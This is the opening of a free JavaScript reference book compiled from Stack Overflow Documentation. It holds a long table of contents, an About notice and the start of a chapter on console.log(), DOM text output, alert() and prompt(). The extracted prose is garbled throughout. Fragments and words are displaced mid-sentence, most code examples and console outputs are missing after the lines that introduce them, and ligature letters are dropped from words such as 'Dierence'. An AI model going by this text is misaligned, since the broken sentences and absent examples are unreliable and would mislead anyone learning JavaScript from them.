

Contents
About	1
Chapter 1: Getting started with JavaScript	2
Section 1.1: Using console.log()	2
Section 1.2: Using the DOM API	4
Section 1.3: Using window.alert()	5
Section 1.4: Using window.prompt()	6
Section 1.5: Using window.confirm()	7
Section 1.6: Using the DOM API (with graphical text: Canvas, SVG, or image file)	8
Chapter 2: JavaScript Variables	10
Section 2.1: Defining a Variable	10
Section 2.2: Using a Variable	10
Section 2.3: Types of Variables	10
Section 2.4: Arrays and Objects	11
Chapter 3: Built-in Constants	12
Section 3.1: null	12
Section 3.2: Testing for NaN using isNaN()	12
Section 3.3: NaN	13
Section 3.4: undefined and null	14
Section 3.5: Infinity and -Infinity	15
Section 3.6: Number constants	15
Section 3.7: Operations that return NaN	16
Section 3.8: Math library functions that return NaN	16
Chapter 4: Comments	17
Section 4.1: Using Comments	17
Section 4.2: Using HTML comments in JavaScript (Bad practice)	17
Chapter 5: Console	19
Section 5.1: Measuring time - console.time()	22
Section 5.2: Formatting console output	23
Section 5.3: Printing to a browser's debugging console	24
Section 5.4: Including a stack trace when logging - console.trace()	26
Section 5.5: Tabulating values - console.table()	26
Section 5.6: Counting - console.count()	28
Section 5.7: Clearing the console - console.clear()	30
Section 5.8: Displaying objects and XML interactively - console.dir(), console.dirxml()	30
Section 5.9: Debugging with assertions - console.assert()	32
Chapter 6: Datatypes in JavaScript	33
Section 6.1: typeof	33
Section 6.2: Finding an object's class	34
Section 6.3: Getting object type by constructor name	34
Chapter 7: Strings	37
Section 7.1: Basic Info and String Concatenation	37
Section 7.2: Reverse String	38
Section 7.3: Comparing Strings Lexicographically	39
Section 7.4: Access character at index in string	40
Section 7.5: Escaping quotes	40
Section 7.6: Word Counter	41
Section 7.7: Trim whitespace	41
Section 7.8: Splitting a string into an array	41
Section 7.9: Strings are unicode	42
Section 7.10: Detecting a string	42
Section 7.11: Substrings with slice	43
Section 7.12: Character code	43
Section 7.13: String Representations of Numbers	43
Section 7.14: String Find and Replace Functions	44
Section 7.15: Find the index of a substring inside a string	45
Section 7.16: String to Upper Case	45
Section 7.17: String to Lower Case	46
Section 7.18: Repeat a String	46
Chapter 8: Date	47
Section 8.1: Create a new Date object	47
Section 8.2: Convert to a string format	49
Section 8.3: Creating a Date from UTC	50
Section 8.4: Formatting a JavaScript date	53
Section 8.5: Get the number of milliseconds elapsed since 1 January 1970 00:00:00 UTC	55
Section 8.6: Get the current time and date	55
Section 8.7: Increment a Date Object	56
Section 8.8: Convert to JSON	57
Chapter 9: Date Comparison	58
Section 9.1: Comparing Date values	58
Section 9.2: Date Dierence Calculation	59
Chapter 10: Comparison Operations	60
Section 10.1: Abstract equality / inequality and type conversion	60
Section 10.2: NaN Property of the Global Object	61
Section 10.3: Short-circuiting in boolean operators	63
Section 10.4: Null and Undefined	65
Section 10.5: Abstract Equality (==)	65
Section 10.6: Logic Operators with Booleans	66
Section 10.7: Automatic Type Conversions	67
Section 10.8: Logic Operators with Non-boolean values (boolean coercion)	67
Section 10.9: Empty Array	68
Section 10.10: Equality comparison operations	68
Section 10.11: Relational operators (<, <=, >, >=)	70
Section 10.12: Inequality	71
Section 10.13: List of Comparison Operators	72
Section 10.14: Grouping multiple logic statements	72
Section 10.15: Bit fields to optimise comparison of multi state data	72
Chapter 11: Conditions	74
Section 11.1: Ternary operators	74
Section 11.2: Switch statement	75
Section 11.3: If / Else If / Else Control	77
Section 11.4: Strategy	78
Section 11.5: Using || and && short circuiting	79
Chapter 12: Arrays	80
Section 12.1: Converting Array-like Objects to Arrays	80
Section 12.2: Reducing values	82
Section 12.3: Mapping values	84
Section 12.4: Filtering Object Arrays	84
Section 12.5: Sorting Arrays	86
Section 12.6: Iteration	88
Section 12.7: Destructuring an array	92
Section 12.8: Removing duplicate elements	93
Section 12.9: Array comparison	93
Section 12.10: Reversing arrays	94
Section 12.11: Shallow cloning an array	95
Section 12.12: Concatenating Arrays	95
Section 12.13: Merge two array as key value pair	97
Section 12.14: Array spread / rest	97
Section 12.15: Filtering values	98
Section 12.16: Searching an Array	99
Section 12.17: Convert a String to an Array	100
Section 12.18: Removing items from an array	100
Section 12.19: Removing all elements	101
Section 12.20: Finding the minimum or maximum element	102
Section 12.21: Standard array initialization	103
Section 12.22: Joining array elements in a string	104
Section 12.23: Removing/Adding elements using splice()	105
Section 12.24: The entries() method	105
Section 12.25: Remove value from array	105
Section 12.26: Flattening Arrays	106
Section 12.27: Append / Prepend items to Array	107
Section 12.28: Object keys and values to array	107
Section 12.29: Logical connective of values	108
Section 12.30: Checking if an object is an Array	108
Section 12.31: Insert an item into an array at a specific index	109
Section 12.32: Sorting multidimensional array	109
Section 12.33: Test all array items for equality	110
Section 12.34: Copy part of an Array	110
Chapter 13: Objects	112
Section 13.1: Shallow cloning	112
Section 13.2: Object.freeze	112
Section 13.3: Object cloning	113
Section 13.4: Object properties iteration	114
Section 13.5: Object.assign	115
Section 13.6: Object rest/spread (...)	116
Section 13.7: Object.defineProperty	116
Section 13.8: Accesor properties (get and set)	117
Section 13.9: Dynamic / variable property names	117
Section 13.10: Arrays are Objects	118
Section 13.11: Object.seal	119
Section 13.12: Convert object's values to array	120
Section 13.13: Retrieving properties from an object	120
Section 13.14: Read-Only property	123
Section 13.15: Non enumerable property	123
Section 13.16: Lock property description	123
Section 13.17: Object.getOwnPropertyDescriptor	124
Section 13.18: Descriptors and Named Properties	124
Section 13.19: Object.keys	126
Section 13.20: Properties with special characters or reserved words	126
Section 13.21: Creating an Iterable object	127
Section 13.22: Iterating over Object entries - Object.entries()	127
Section 13.23: Object.values()	128
Chapter 14: Arithmetic (Math)	129
Section 14.1: Constants	129
Section 14.2: Remainder / Modulus (%)	129
Section 14.3: Rounding	130
Section 14.4: Trigonometry	132
Section 14.5: Bitwise operators	133
Section 14.6: Incrementing (++)	135
Section 14.7: Exponentiation (Math.pow() or **)	135
Section 14.8: Random Integers and Floats	136
Section 14.9: Addition (+)	137
Section 14.10: Little / Big endian for typed arrays when using bitwise operators	137
Section 14.11: Get Random Between Two Numbers	138
Section 14.12: Simulating events with dierent probabilities	139
Section 14.13: Subtraction (-)	140
Section 14.14: Multiplication (*)	140
Section 14.15: Getting maximum and minimum	140
Section 14.16: Restrict Number to Min/Max Range	141
Section 14.17: Ceiling and Floor	141
Section 14.18: Getting roots of a number	142
Section 14.19: Random with gaussian distribution	142
Section 14.20: Math.atan2 to find direction	143
Section 14.21: Sin & Cos to create a vector given direction & distance	143
Section 14.22: Math.hypot	144
Section 14.23: Periodic functions using Math.sin	145
Section 14.24: Division (/)	146
Section 14.25: Decrementing (--)	146
Chapter 15: Bitwise operators	148
Section 15.1: Bitwise operators	148
Section 15.2: Shift Operators	150
Chapter 16: Constructor functions	151
Section 16.1: Declaring a constructor function	151
Chapter 17: Declarations and Assignments	152
Section 17.1: Modifying constants	152
Section 17.2: Declaring and initializing constants	152
Section 17.3: Declaration	152
Section 17.4: Undefined	153
Section 17.5: Data Types	153
Section 17.6: Mathematic operations and assignment	153
Section 17.7: Assignment	155
Chapter 18: Loops	156
Section 18.1: Standard "for" loops	156
Section 18.2: "for ... of" loop	157
Section 18.3: "for ... in" loop	159
Section 18.4: "while" Loops	159
Section 18.5: "continue" a loop	160
Section 18.6: Break specific nested loops	161
Section 18.7: "do ... while" loop	161
Section 18.8: Break and continue labels	161
Chapter 19: Functions	163
Section 19.1: Function Scoping	163
Section 19.2: Currying	164
Section 19.3: Immediately Invoked Function Expressions	165
Section 19.4: Named Functions	166
Section 19.5: Binding `this` and arguments	169
Section 19.6: Functions with an Unknown Number of Arguments (variadic functions)	171
Section 19.7: Anonymous Function	172
Section 19.8: Default parameters	174
Section 19.9: Call and apply	176
Section 19.10: Partial Application	177
Section 19.11: Passing arguments by reference or value	178
Section 19.12: Function Arguments, "arguments" object, rest and spread parameters	179
Section 19.13: Function Composition	179
Section 19.14: Get the name of a function object	180
Section 19.15: Recursive Function	180
Section 19.16: Using the Return Statement	181
Section 19.17: Functions as a variable	182
Chapter 20: Functional JavaScript	185
Section 20.1: Higher-Order Functions	185
Section 20.2: Identity Monad	185
Section 20.3: Pure Functions	187
Section 20.4: Accepting Functions as Arguments	188
Chapter 21: Prototypes, objects	190
Section 21.1: Creation and initialising Prototype	190
Chapter 22: Classes	192
Section 22.1: Class Constructor	192
Section 22.2: Class Inheritance	192
Section 22.3: Static Methods	193
Section 22.4: Getters and Setters	193
Section 22.5: Private Members	194
Section 22.6: Methods	195
Section 22.7: Dynamic Method Names	195
Section 22.8: Managing Private Data with Classes	196
Section 22.9: Class Name binding	198
Chapter 23: Namespacing	199
Section 23.1: Namespace by direct assignment	199
Section 23.2: Nested Namespaces	199
Chapter 24: Context (this)	200
Section 24.1: this with simple objects	200
Section 24.2: Saving this for use in nested functions / objects	200
Section 24.3: Binding function context	201
Section 24.4: this in constructor functions	202
Chapter 25: Setters and Getters	203
Section 25.1: Defining a Setter/Getter Using Object.defineProperty	203
Section 25.2: Defining an Setter/Getter in a Newly Created Object	203
Section 25.3: Defining getters and setters in ES6 class	203
Chapter 26: Events	205
Section 26.1: Page, DOM and Browser loading	205
Chapter 27: Inheritance	206
Section 27.1: Standard function prototype	206
Section 27.2: Dierence between Object.key and Object.prototype.key	206
Section 27.3: Prototypal inheritance	206
Section 27.4: Pseudo-classical inheritance	207
Section 27.5: Setting an Object's prototype	208
Chapter 28: Method Chaining	210
Section 28.1: Chainable object design and chaining	210
Section 28.2: Method Chaining	212
Chapter 29: Callbacks	213
Section 29.1: Simple Callback Usage Examples	213
Section 29.2: Continuation (synchronous and asynchronous)	214
Section 29.3: What is a callback?	215
Section 29.4: Callbacks and `this`	216
Section 29.5: Callback using Arrow function	217
Section 29.6: Error handling and control-flow branching	218
Chapter 30: Intervals and Timeouts	219
Section 30.1: Recursive setTimeout	219
Section 30.2: Intervals	219
Section 30.3: Intervals	219
Section 30.4: Removing intervals	220
Section 30.5: Removing timeouts	220
Section 30.6: setTimeout, order of operations, clearTimeout	220
Chapter 31: Regular expressions	222
Section 31.1: Creating a RegExp Object	222
Section 31.2: RegExp Flags	222
Section 31.3: Check if string contains pattern using .test()	223
Section 31.4: Matching With .exec()	223
Section 31.5: Using RegExp With Strings	223
Section 31.6: RegExp Groups	224
Section 31.7: Replacing string match with a callback function	225
Section 31.8: Using Regex.exec() with parentheses regex to extract matches of a string	226
Chapter 32: Cookies	228
Section 32.1: Test if cookies are enabled	228
Section 32.2: Adding and Setting Cookies	228
Section 32.3: Reading cookies	228
Section 32.4: Removing cookies	228
Chapter 33: Web Storage	229
Section 33.1: Using localStorage	229
Section 33.2: Simpler way of handling Storage	229
Section 33.3: Storage events	230
Section 33.4: sessionStorage	231
Section 33.5: localStorage length	232
Section 33.6: Error conditions	232
Section 33.7: Clearing storage	232
Section 33.8: Remove Storage Item	232
Chapter 34: Data attributes	233
Section 34.1: Accessing data attributes	233
Chapter 35: JSON	234
Section 35.1: JSON versus JavaScript literals	234
Section 35.2: Parsing with a reviver function	235
Section 35.3: Serializing a value	236
Section 35.4: Serializing and restoring class instances	237
Section 35.5: Serializing with a replacer function	238
Section 35.6: Parsing a simple JSON string	239
Section 35.7: Cyclic object values	239
Chapter 36: AJAX	240
Section 36.1: Sending and Receiving JSON Data via POST	240
Section 36.2: Add an AJAX preloader	240
Section 36.3: Displaying the top JavaScript questions of the month from Stack Overflow's API	241
Section 36.4: Using GET with parameters	242
Section 36.5: Check if a file exists via a HEAD request	243
Section 36.6: Using GET and no parameters	243
Section 36.7: Listening to AJAX events at a global level	243
Chapter 37: Enumerations	244
Section 37.1: Enum definition using Object.freeze()	244
Section 37.2: Alternate definition	244
Section 37.3: Printing an enum variable	244
Section 37.4: Implementing Enums Using Symbols	245
Section 37.5: Automatic Enumeration Value	245
Chapter 38: Map	247
Section 38.1: Creating a Map	247
Section 38.2: Clearing a Map	247
Section 38.3: Removing an element from a Map	247
Section 38.4: Checking if a key exists in a Map	248
Section 38.5: Iterating Maps	248
Section 38.6: Getting and setting elements	248
Section 38.7: Getting the number of elements of a Map	249
Chapter 39: Timestamps	250
Section 39.1: High-resolution timestamps	250
Section 39.2: Get Timestamp in Seconds	250
Section 39.3: Low-resolution timestamps	250
Section 39.4: Support for legacy browsers	250
Chapter 40: Unary Operators	251
Section 40.1: Overview	251
Section 40.2: The typeof operator	251
Section 40.3: The delete operator	252
Section 40.4: The unary plus operator (+)	253
Section 40.5: The void operator	254
Section 40.6: The unary negation operator (-)	255
Section 40.7: The bitwise NOT operator (~)	255
Section 40.8: The logical NOT operator (!)	256
Chapter 41: Generators	258
Section 41.1: Generator Functions	258
Section 41.2: Sending Values to Generator	259
Section 41.3: Delegating to other Generator	259
Section 41.4: Iteration	259
Section 41.5: Async flow with generators	260
Section 41.6: Iterator-Observer interface	261
Chapter 42: Promises	263
Section 42.1: Introduction	263
Section 42.2: Promise chaining	264
Section 42.3: Waiting for multiple concurrent promises	265
Section 42.4: Reduce an array to chained promises	266
Section 42.5: Waiting for the first of multiple concurrent promises	267
Section 42.6: "Promisifying" functions with callbacks	268
Section 42.7: Error Handling	268
Section 42.8: Reconciling synchronous and asynchronous operations	272
Section 42.9: Delay function call	273
Section 42.10: "Promisifying" values	273
Section 42.11: Using ES2017 async/await	274
Section 42.12: Performing cleanup with finally()	274
Section 42.13: forEach with promises	275
Section 42.14: Asynchronous API request	275
Chapter 43: Set	277
Section 43.1: Creating a Set	277
Section 43.2: Adding a value to a Set	277
Section 43.3: Removing value from a set	277
Section 43.4: Checking if a value exist in a set	278
Section 43.5: Clearing a Set	278
Section 43.6: Getting set length	278
Section 43.7: Converting Sets to arrays	278
Section 43.8: Intersection and dierence in Sets	279
Section 43.9: Iterating Sets	279
Chapter 44: Modals - Prompts	280
Section 44.1: About User Prompts	280
Section 44.2: Persistent Prompt Modal	280
Section 44.3: Confirm to Delete element	281
Section 44.4: Usage of alert()	281
Section 44.5: Usage of prompt()	282
Chapter 45: execCommand and contenteditable	283
Section 45.1: Listening to Changes of contenteditable	284
Section 45.2: Getting started	284
Section 45.3: Copy to clipboard from textarea using execCommand("copy")	285
Section 45.4: Formatting	285
Chapter 46: History	287
Section 46.1: history.pushState()	287
Section 46.2: history.replaceState()	287
Section 46.3: Load a specific URL from the history list	287
Chapter 47: Navigator Object	289
Section 47.1: Get some basic browser data and return it as a JSON object	289
Chapter 48: BOM (Browser Object Model)	290
Section 48.1: Introduction	290
Section 48.2: Window Object Properties	290
Section 48.3: Window Object Methods	291
Chapter 49: The Event Loop	292
Section 49.1: The event loop in a web browser	292
Section 49.2: Asynchronous operations and the event loop	293
Chapter 50: Strict mode	294
Section 50.1: For entire scripts	294
Section 50.2: For functions	294
Section 50.3: Changes to properties	294
Section 50.4: Changes to global properties	295
Section 50.5: Duplicate Parameters	296
Section 50.6: Function scoping in strict mode	296
Section 50.7: Behaviour of a function's arguments list	296
Section 50.8: Non-Simple parameter lists	297
Chapter 51: Custom Elements	299
Section 51.1: Extending Native Elements	299
Section 51.2: Registering New Elements	299
Chapter 52: Data Manipulation	300
Section 52.1: Format numbers as money	300
Section 52.2: Extract extension from file name	300
Section 52.3: Set object property given its string name	301
Chapter 53: Binary Data	302
Section 53.1: Getting binary representation of an image file	302
Section 53.2: Converting between Blobs and ArrayBuers	302
Section 53.3: Manipulating ArrayBuers with DataViews	303
Section 53.4: Creating a TypedArray from a Base64 string	303
Section 53.5: Using TypedArrays	304
Section 53.6: Iterating through an arrayBuer	304
Chapter 54: Template Literals	306
Section 54.1: Basic interpolation and multiline strings	306
Section 54.2: Tagged strings	306
Section 54.3: Raw strings	307
Section 54.4: Templating HTML With Template Strings	307
Section 54.5: Introduction	308
Chapter 55: Fetch	309
Section 55.1: Getting JSON data	309
Section 55.2: Set Request Headers	309
Section 55.3: POST Data	309
Section 55.4: Send cookies	310
Section 55.5: GlobalFetch	310
Section 55.6: Using Fetch to Display Questions from the Stack Overflow API	310
Chapter 56: Scope	311
Section 56.1: Closures	311
Section 56.2: Hoisting	312
Section 56.3: Dierence between var and let	315
Section 56.4: Apply and Call syntax and invocation	317
Section 56.5: Arrow function invocation	318
Section 56.6: Bound invocation	319
Section 56.7: Method invocation	319
Section 56.8: Anonymous invocation	320
Section 56.9: Constructor invocation	320
Section 56.10: Using let in loops instead of var (click handlers example)	320
Chapter 57: Modules	322
Section 57.1: Defining a module	322
Section 57.2: Default exports	322
Section 57.3: Importing named members from another module	323
Section 57.4: Importing an entire module	323
Section 57.5: Importing named members with aliases	324
Section 57.6: Importing with side eects	324
Section 57.7: Exporting multiple named members	324
Chapter 58: Screen	325
Section 58.1: Getting the screen resolution	325
Section 58.2: Getting the "available" area of the screen	325
Section 58.3: Page width and height	325
Section 58.4: Window innerWidth and innerHeight Properties	325
Section 58.5: Getting color information about the screen	325
Chapter 59: Variable coercion/conversion	326
Section 59.1: Double Negation (!!x)	326
Section 59.2: Implicit conversion	326
Section 59.3: Converting to boolean	326
Section 59.4: Converting a string to a number	327
Section 59.5: Converting a number to a string	328
Section 59.6: Primitive to Primitive conversion table	328
Section 59.7: Convert an array to a string	328
Section 59.8: Array to String using array methods	329
Section 59.9: Converting a number to a boolean	329
Section 59.10: Converting a string to a boolean	329
Section 59.11: Integer to Float	329
Section 59.12: Float to Integer	330
Section 59.13: Convert string to float	330
Chapter 60: Destructuring assignment	331
Section 60.1: Destructuring Objects	331
Section 60.2: Destructuring function arguments	332
Section 60.3: Nested Destructuring	332
Section 60.4: Destructuring Arrays	333
Section 60.5: Destructuring inside variables	333
Section 60.6: Default Value While Destructuring	334
Section 60.7: Renaming Variables While Destructuring	334
Chapter 61: WebSockets	335
Section 61.1: Working with string messages	335
Section 61.2: Establish a web socket connection	335
Section 61.3: Working with binary messages	335
Section 61.4: Making a secure web socket connection	336
Chapter 62: Arrow Functions	337
Section 62.1: Introduction	337
Section 62.2: Lexical Scoping & Binding (Value of "this")	337
Section 62.3: Arguments Object	338
Section 62.4: Implicit Return	338
Section 62.5: Arrow functions as a constructor	339
Section 62.6: Explicit Return	339
Chapter 63: Workers	340
Section 63.1: Web Worker	340
Section 63.2: A simple service worker	340
Section 63.3: Register a service worker	341
Section 63.4: Communicating with a Web Worker	341
Section 63.5: Terminate a worker	342
Section 63.6: Populating your cache	343
Section 63.7: Dedicated Workers and Shared Workers	343
Chapter 64: requestAnimationFrame	345
Section 64.1: Use requestAnimationFrame to fade in element	345
Section 64.2: Keeping Compatibility	346
Section 64.3: Cancelling an Animation	346
Chapter 65: Creational Design Patterns	348
Section 65.1: Factory Functions	348
Section 65.2: Factory with Composition	349
Section 65.3: Module and Revealing Module Patterns	350
Section 65.4: Prototype Pattern	352
Section 65.5: Singleton Pattern	353
Section 65.6: Abstract Factory Pattern	354
Chapter 66: Detecting browser	355
Section 66.1: Feature Detection Method	355
Section 66.2: User Agent Detection	355
Section 66.3: Library Method	356
Chapter 67: Symbols	357
Section 67.1: Basics of symbol primitive type	357
Section 67.2: Using Symbol.for() to create global, shared symbols	357
Section 67.3: Converting a symbol into a string	357
Chapter 68: Transpiling	359
Section 68.1: Introduction to Transpiling	359
Section 68.2: Start using ES6/7 with Babel	360
Chapter 69: Automatic Semicolon Insertion - ASI	361
Section 69.1: Avoid semicolon insertion on return statements	361
Section 69.2: Rules of Automatic Semicolon Insertion	361
Section 69.3: Statements aected by automatic semicolon insertion	362
Chapter 70: Localization	364
Section 70.1: Number formatting	364
Section 70.2: Currency formatting	364
Section 70.3: Date and time formatting	364
Chapter 71: Geolocation	365
Section 71.1: Get updates when a user's location changes	365
Section 71.2: Get a user's latitude and longitude	365
Section 71.3: More descriptive error codes	365
Chapter 72: IndexedDB	367
Section 72.1: Opening a database	367
Section 72.2: Adding objects	367
Section 72.3: Retrieving data	368
Section 72.4: Testing for IndexedDB availability	369
Chapter 73: Modularization Techniques	370
Section 73.1: ES6 Modules	370
Section 73.2: Universal Module Definition (UMD)	370
Section 73.3: Immediately invoked function expressions (IIFE)	371
Section 73.4: Asynchronous Module Definition (AMD)	371
Section 73.5: CommonJS - Node.js	372
Chapter 74: Proxy	374
Section 74.1: Proxying property lookup	374
Section 74.2: Very simple proxy (using the set trap)	374
Chapter 75: .postMessage() and MessageEvent	376
Section 75.1: Getting Started	376
Chapter 76: WeakMap	379
Section 76.1: Creating a WeakMap object	379
Section 76.2: Getting a value associated to the key	379
Section 76.3: Assigning a value to the key	379
Section 76.4: Checking if an element with the key exists	379
Section 76.5: Removing an element with the key	380
Section 76.6: Weak reference demo	380
Chapter 77: WeakSet	382
Section 77.1: Creating a WeakSet object	382
Section 77.2: Adding a value	382
Section 77.3: Checking if a value exists	382
Section 77.4: Removing a value	382
Chapter 78: Escape Sequences	383
Section 78.1: Entering special characters in strings and regular expressions	383
Section 78.2: Escape sequence types	383
Chapter 79: Behavioral Design Patterns	386
Section 79.1: Observer pattern	386
Section 79.2: Mediator Pattern	387
Section 79.3: Command	388
Section 79.4: Iterator	389
Chapter 80: Server-sent events	391
Section 80.1: Setting up a basic event stream to the server	391
Section 80.2: Closing an event stream	391
Section 80.3: Binding event listeners to EventSource	391
Chapter 81: Async functions (async/await)	393
Section 81.1: Introduction	393
Section 81.2: Await and operator precedence	393
Section 81.3: Async functions compared to Promises	394
Section 81.4: Looping with async await	395
Section 81.5: Less indentation	396
Section 81.6: Simultaneous async (parallel) operations	397
Chapter 82: Async Iterators	398
Section 82.1: Basics	398
Chapter 83: How to make iterator usable inside async callback function	399
Section 83.1: Erroneous code, can you spot why this usage of key will lead to bugs?	399
Section 83.2: Correct Writing	399
Chapter 84: Tail Call Optimization	400
Section 84.1: What is Tail Call Optimization (TCO)	400
Section 84.2: Recursive loops	400
Chapter 85: Bitwise Operators - Real World Examples (snippets)	401
Section 85.1: Swapping Two Integers with Bitwise XOR (without additional memory allocation)	401
Section 85.2: Faster multiplication or division by powers of 2	401
Section 85.3: Number's Parity Detection with Bitwise AND	401
Chapter 86: Tilde ~	403
Section 86.1: ~ Integer	403
Section 86.2: ~~ Operator	403
Section 86.3: Converting Non-numeric values to Numbers	404
Section 86.4: Shorthands	404
Section 86.5: ~ Decimal	404
Chapter 87: Using JavaScript to get/set CSS custom variables	406
Section 87.1: How to get and set CSS variable property values	406
Chapter 88: Selection API	407
Section 88.1: Get the text of the selection	407
Section 88.2: Deselect everything that is selected	407
Section 88.3: Select the contents of an element	407
Chapter 89: File API, Blobs and FileReaders	408
Section 89.1: Read file as string	408
Section 89.2: Read file as dataURL	408
Section 89.3: Slice a file	409
Section 89.4: Get the properties of the file	409
Section 89.5: Selecting multiple files and restricting file types	410
Section 89.6: Client side csv download using Blob	410
Chapter 90: Notifications API	411
Section 90.1: Requesting Permission to send notifications	411
Section 90.2: Sending Notifications	411
Section 90.3: Closing a notification	411
Section 90.4: Notification events	412
Chapter 91: Vibration API	413
Section 91.1: Single vibration	413
Section 91.2: Check for support	413
Section 91.3: Vibration patterns	413
Chapter 92: Battery Status API	414
Section 92.1: Battery Events	414
Section 92.2: Getting current battery level	414
Section 92.3: Is battery charging?	414
Section 92.4: Get time left until battery is empty	414
Section 92.5: Get time left until battery is fully charged	414
Chapter 93: Fluent API	415
Section 93.1: Fluent API capturing construction of HTML articles with JS	415
Chapter 94: Web Cryptography API	417
Section 94.1: Creating digests (e.g. SHA-256)	417
Section 94.2: Cryptographically random data	417
Section 94.3: Generating RSA key pair and converting to PEM format	418
Section 94.4: Converting PEM key pair to CryptoKey	419
Chapter 95: Security issues	421
Section 95.1: Reflected Cross-site scripting (XSS)	421
Section 95.2: Persistent Cross-site scripting (XSS)	422
Section 95.3: Persistent Cross-site scripting from JavaScript string literals	423
Section 95.4: Why scripts from other people can harm your website and its visitors	423
Section 95.5: Evaled JSON injection	424
Chapter 96: Same Origin Policy & Cross-Origin Communication	426
Section 96.1: Safe cross-origin communication with messages	426
Section 96.2: Ways to circumvent Same-Origin Policy	427
Chapter 97: Error Handling	429
Section 97.1: Error objects	429
Section 97.2: Interaction with Promises	429
Section 97.3: Error types	430
Section 97.4: Order of operations plus advanced thoughts	430
Chapter 98: Global error handling in browsers	433
Section 98.1: Handling window.onerror to report all errors back to the server-side	433
Chapter 99: Debugging	435
Section 99.1: Interactive interpreter variables	435
Section 99.2: Breakpoints	435
Section 99.3: Using setters and getters to find what changed a property	436
Section 99.4: Using the console	437
Section 99.5: Automatically pausing execution	438
Section 99.6: Elements inspector	438
Section 99.7: Break when a function is called	438
Section 99.8: Stepping through code	439
Chapter 100: Unit Testing JavaScript	440
Section 100.1: Unit Testing Promises with Mocha, Sinon, Chai and Proxyquire	440
Section 100.2: Basic Assertion	442
Chapter 101: Evaluating JavaScript	444
Section 101.1: Evaluate a string of JavaScript statements	444
Section 101.2: Introduction	444
Section 101.3: Evaluation and Math	444
Chapter 102: Linters - Ensuring code quality	445
Section 102.1: JSHint	445
Section 102.2: ESLint / JSCS	446
Section 102.3: JSLint	446
Chapter 103: Anti-patterns	447
Section 103.1: Chaining assignments in var declarations	447
Chapter 104: Performance Tips	448
Section 104.1: Avoid try/catch in performance-critical functions	448
Section 104.2: Limit DOM Updates	448
Section 104.3: Benchmarking your code - measuring execution time	449
Section 104.4: Use a memoizer for heavy-computing functions	451
Section 104.5: Initializing object properties with null	453
Section 104.6: Reuse objects rather than recreate	454
Section 104.7: Prefer local variables to globals, attributes, and indexed values	455
Section 104.8: Be consistent in use of Numbers	456
Chapter 105: Memory eciency	458
Section 105.1: Drawback of creating true private method	458
Appendix A: Reserved Keywords	459
Section A.1: Reserved Keywords	459
Section A.2: Identifiers & Identifier Names	461
Credits	463
You may also like	474


About
Please feel free to share this PDF with anyone for free, latest version of this book can be downloaded from:
https://goalkicker.com/JavaScriptBook
This JavaScript(r) Notes for Professionals book is compiled from Stack Overflow
Documentation, the content is written by the beautiful people at Stack Overflow.
Text content is released under Creative Commons BY-SA, see credits at the end of this book whom contributed to the various chapters. Images may be copyright of their respective owners unless otherwise specified
This is an unofficial free book created for educational purposes and is not affiliated with official JavaScript(r) group(s) or company(s) nor Stack Overflow. All trademarks and registered trademarks are the property of their respective company owners
The information presented in this book is not guaranteed to be correct nor accurate, use at your own risk
Please send feedback and corrections to web@petercv.com
Chapter 1: Getting started with JavaScript
Version Release Date
1 1997-06-01
2 1998-06-01
3 1998-12-01
E4X 2004-06-01 5 2009-12-01
5.1	2011-06-01
6 2015-06-01
7 2016-06-14
8 2017-06-27
Section 1.1: Using console.log()
Introduction
console.logAll modern web browsers, Node.js as well as almost every other JavaScript environments support writing messages to a console using a suite of logging methods. The most common of these methods is ().
console.logIn a browser environment, the () function is predominantly used for debugging purposes.
Getting Started
Open up the JavaScript Console in your browser, type the following, and press  Enter :
console.log("Hello, World!");
This will log the following to the console:

console.log() function prints Hello, WorldIn the example above, the ! to the console and returns undefined
console.log(shown above in the console output window). This is because () has no explicit return value.
Logging variables
console.log() can be used to log variables of any kind; not only strings. Just pass in the variable that you want to
be displayed in the console, for example:

This will log the following to the console:

If you want to log two or more values, simply separate them with commas. Spaces will be automatically added between each argument during concatenation: console.log("thisVar:", thisVar, "and thatVar:", thatVar); This will log the following to the console:

Placeholders
console.logYou can use () in combination with placeholders:

This will log the following to the console:

Logging Objects
Below we see the result of logging an object. This is often useful for logging JSON responses from API calls.


This will log the following to the console:

Logging HTML elements
You have the ability to log any element which exists within the DOM. In this case we log the body element:

This will log the following to the console:

End Note
For more information on the capabilities of the console, see the Console topic.
Section 1.2: Using the DOM API
DOM stands for Document Object Model. It is an object-oriented representation of structured documents like XML and HTML.
Setting the textContent property of an Element is one way to output text on a web page.
For example, consider the following HTML tag:

To change its textContent property, we can run the following JavaScript:
document.getElementById("paragraph").textContent = "Hello, World";
This will select the element that with the id paragraph and set its text content to "Hello, World":

(See also this demo)
You can also use JavaScript to create a new HTML element programmatically. For example, consider an HTML document with the following body:

<pIn our JavaScript, we create a new > tag with a textContent property of and add it at the end of the html body:
var element = document.createElement('p'); element.textContent = "Hello, World";
 document.body.appendChild(element); //add the newly created element to the DOM That will change your HTML body to the following:

<script<bodyNote that in order to manipulate elements in the DOM using JavaScript, the JavaScript code must be run after the relevant element has been created in the document. This can be achieved by putting the JavaScript > tags after all of your other > content. Alternatively, you can also use an event listener to listen to eg. window's onload event, adding your code to that event listener will delay running your code until after the whole content on your page has been loaded.
A third way to make sure all your DOM has been loaded, is to wrap the DOM manipulation code with a timeout function of 0 ms. This way, this JavaScript code is re-queued at the end of the execution queue, which gives the browser a chance to finish doing some non-JavaScript things that have been waiting to finish before attending to this new piece of JavaScript.
Section 1.3: Using window.alert()
The alert method displays a visual alert box on screen. The alert method parameter is displayed to the user in plain text:

Because window is the global object, you can call also use the following shorthand:

window.alertSo what does () do? Well, let's take the following example:

In Chrome, that would produce a pop-up like this:

Notes
alert() instead of window.alertThe alert method is technically a property of window object, but since all window properties are automatically global variables, we can use alert as a global variable instead of as a property of window meaning you can directly use ().
console.logUnlike using , alert acts as a modal prompt meaning that the code calling alert will pause until the prompt is answered. Traditionally this means that no other JavaScript code will execute until the alert is dismissed:

However the specification actually allows other event-triggered code to continue to execute even though a modal dialog is still being shown. In such implementations, it is possible for other code to run while the modal dialog is being shown.
More information about usage of the alert method can be found in the modals prompts topic.
The use of alerts is usually discouraged in favour of other methods that do not block users from interacting with the page - in order to create a better user experience. Nevertheless, it can be useful for debugging.
window.alert() is blocked inside an <iframeStarting with Chrome 46.0, > unless its sandbox attribute has the value allow-modal.
Section 1.4: Using window.prompt()
promptAn easy way to get an input from a user is by using the () method.
Syntax


If the user clicks the  OK  button, the input value is returned. Otherwise, the method returns null.
The return value of prompt is always a string, unless the user clicks  Cancel , in which that case it returns null. Safari is an exception in that when the user clicks Cancel, the function returns an empty string. From there, you can convert the return value to another type, such as an integer.
Notes
